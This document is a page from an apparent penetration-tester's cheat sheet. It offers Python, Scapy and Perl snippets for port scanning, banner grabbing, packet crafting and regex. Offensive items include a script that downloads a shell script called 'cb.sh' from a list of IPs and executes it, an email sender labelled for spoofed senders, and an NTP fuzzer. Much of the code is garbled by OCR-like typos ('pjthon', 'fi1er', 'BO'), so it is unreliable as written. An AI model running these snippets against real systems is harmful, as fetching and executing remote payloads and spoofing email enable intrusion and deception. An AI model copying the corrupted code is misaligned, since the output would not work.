---
layout: default
---

# Programming

### Python port scanner

```text
import socket as sk
for port in range (1, 1024):
    try:
        s=sk. socket ( sk .AF _ INET, sk. SOCK_ STREAM)
        s.settimeout(1000)
        s. connect ( (' 127. 0. 0. 1 ' , port) )
        print '%d:OPEN' % (port)
        s.close
    except: continue    
```

### Python base64 wordlist

```text
#!/usr/bin/pjthon
import base64
filel=open("pwd.lst","r")
file2=open("b64pwds.lst","w")
for line in file1:
    clear= "administrator:"+ str.strip(line)
    new= base64.encodestring(clear)
    file2.write(new)
```

### Convert windows registry hex format to readable ascii

```text
import binascii, sys, string
dataFormatHex = binascii.a2b_hex(sys.argv[1])
output = ""
for char in dataFormatEex:
    if char in string.printable: output += char
    else: output += "."
print ''\n'' + output
```

### Read all files in folder and search for regex 

```text
import glob, re
for msg in glob.glob('/tmp/.txt'):
    filer = open ((msg), 'r')
    data = fi1er.read()
    message= re.findall(r' message (.'?) /message ', data, re.DOTALL)
    print "File %s contains %s" % (str(msg) ,message)
    fi1er.c1ose()
```

### Ssl encrypted simplehttpserver

```text
# Create SSL cert (follow prompts for customization)
  openssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes

#Create httpserver.pj
  import BaseHTTPServer,SimpleHTTPServer,ssl

cert ="cert.pem"
httpd = BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),
Simp1eHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)
httpd.serve_forever()
```

### Python http server

```text
python -m SimpleHTTPServer 8080
```

### Python email sender \(\* sendmail must be installed\)

```text
#!/usr/bin/python
import smtplib, string
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

    HOST = "localhost"
    SUBJECT = "Email from spoofed sender"
    TO = "target@you.com"
    FROM= "spoof@spoof.com"
    TEXT = "Message Body"
    BODY = string.join( (
            "From: %s" % FROH,
            "To: %s" % TO,
            "Subject: %s" % SUBJECT ,
            "",
            TEXT
            ) , "\r\n")
server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server. quit ()
time.sleep(4)
os.system("/etc/init.d/sendmail stop")
```

### Loop through ip list, download file over http and execute

```text
#!/usr/bin/python
import urllib2, os

urls = [ "1 1.1.1.1","2.2.2.2"]
port = "80"
payload = "cb.sh"

for url in urls:
    u = "http://%s:%s/%s" % (url, port, payload)
    try:
        r = urllib2.urlopen(u)
        wfile = open{"/tmp/cb.sh", "wb")
        wfile.write(r.read())
        wfile. close ()
        break
    except: continue

if os.path.exists("/tmp/cb.sh"):
    os.system("chmod 700 /tmp/cb.sh")
    os. system ( "/tmp/cb. sh")
```

### Python http banner grabber \(\* takes an ip rane, port and packet delay\)

```text
#!/usr/bin/python
import urllib2, sys, time

from optparse import OptionParser

parser= OptionParser()
parser.add option{''-t'', dest=''iprange'',help=''target IP range, i.e.
192.168.1.1-25")
parser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')
parser.add=option("-d", dest="delay",default=".5",help="delay (in seconds),
default=.5 seconds")

(opts, args) = parser.parse_args()

if opts.iprange is None:
    parser.error("you must supply an IP range")

ips = []
headers={}

octets= opts.iprange.split(' .')

start= octets[3] .split('-') [0]
stop = octets [ 3] . split ( '-' ) [ 1]

for i in range(int(start),int(stop)+1):
    ips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))
print '\nScanning IPs: %s\n' % (ips)

for ip in ips:
    try:
        response= urllib2.urlopen('http://%s:%s' % (ip,opts.port))
        headers[ip] = dict(response.info())
    except Exception as e:
        headers[ip] = "Error: " + str(e)
        
time.sleep(float(opts.delay))

for header in headers:
    try:
        print '%s : %s' % (header,headers[header] .get('server'))
    except:
        print '%s : %s' % (header,headers[header])
```

## Scrapy

When you craft TCP packets with Scapy, the underlying OS will not recognize the initial SYN packet and will reply with a RST packet. To mitigate this you need to set the following Iptables rule: iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP 

| **Expression** | **Description** |
| :--- | :--- |
| from scapy.all import \* | Imports all scapy libraries |
| ls \(\) | List all avaiable protocols |
| lsc \(\) | List all scapy functions |
| conf | Show/set scapy config |
| IP\(src=RandiP\(\)\) | Generate random src IPs |
| Ether\(src=RandMAC\(\) I | Generate random src MACs |
| ip=IP\(src="1.1.1.1",dst="2.2.2.2"\) | Specify IP parameters |
| tcp=TCP\(dport="443"\) | Specify TCP parameters |
| data= "TCP data" | Specify data portion |
| packet=ip/tcp/data | Create IP\(\)/TCP\(\) packet |
| packet.show\(\) | Display packet configuration |
| send\(packet,count=1\) | Send 1 packet @ layer 3 |
| sendp\(packet,count=2\) | Send 2 packets @ layer 2 |
| sendpfast\(packet\) | Send faster using tcpreply |
| sr\(packet\) | Send 1 packet & get replies |
| sr1\(packet\) | Send only return 1st reply |
| for i in range\(0,1000\): send \(packet·\) | Send packet- 1000 times |
| sniff\(count=100,iface=eth0\) | Sniff 100 packets on eth0 |

### Send Ipv6 ICMP msg

```text
sr ( IPv6 ( src=" ipv6 ", dst="ipv6")/ ICMP ())
```

### UDP packet w/ specific payload:

```text
ip=IP(src="ip", dst="ip")
u=UDP(dport=1234, sport=5678)
pay = "my UDP packet"
packet=ip/u/pay
packet.show( )
wrpcap ("out.pcap",packet) :write to pcap
send(packet)
```

### Ntp fuzzer

```text
packet=IP(src="ip" ,dst=" ip ")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4))
```

### Send http message

```text
from scapy.all import *
# Add iptables rule to block attack box from sending RSTs
# Create web.txt with entire GET/POST packet data
fileweb = open("web.txt",'r')
data = fileweb.read()
ip = IP(dst="ip")
SYN=ip/TCP(rport=RandNum(6000,7000),dport=BO,flags="S",seq=4)
SYNACK = sr1(SYN)
ACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags="A",seq=SYNACK.ack,ack=SYNACK.
seq+l)/data
reply,error = sr(ACK)
print reply.show()
```

## Perl

### Perl port scanner

```text
use strict; use IO::Socket;
for($port=0;$port 65535;$port++) {
$remote=IO::Socket::INET- new(
Proto= "tcp",PeerAddr= "127.0.0.1",PeerPort= $port);
if($remote) {print "$port is open\n"); )
```

## Regex Expression

| **Expression** | **Description** |
| :--- | :--- |
| ^ | Start of string |
| \* | 0 or more |
| + | 1 or more |
| ? | 0 or 1 |
| . | Any char but \n |
| {3} | Exactly 3 |
| {3,} | 3 or more |
| {3,5} | 3 or 4 or 5 |
| {3\|5} | 3 or 5 |
| \[345\] | 3 or 4 or 5 |
| \[ ^34\] | Not 3 or 4 |
| \[a-z\] | lowercase a-z |
| \[A-Z\] | uppercase A-Z |
| \[0-9\] | digit 0-9 |
| \d | Digit |
| \D | Not digit |
| \w | A-Z,a-z,0-9 |
| \W | Not A-Z,a-z,0-9 |
| \s | White Space \(\t\r\n\f\) |
| \S | Not \(\t\r\n\f\) |
| reg\[ex\] | "rege" or "regx" |
| regex? | ''rege'' or ''regex'' |
| regex\* | ''rege'' w/ 0 or more x |
| regex+ | ''rege'' w/ 1 or more x |
| \[Rr\]egex | ''Regex'' or ''regex'' |
| \d{3} | Exactly 3 digits |
| \d{ 3,\) | 3 or more digits |
| \[aeiou\] | Any 1 vowel |
| \(0 \[3-9\] \|1 \[0-9\]\|2 \[0-5\]\) | Numbers 03-25 |

## Ascii tables

![IBM](.gitbook/assets/ascii_table.gif)

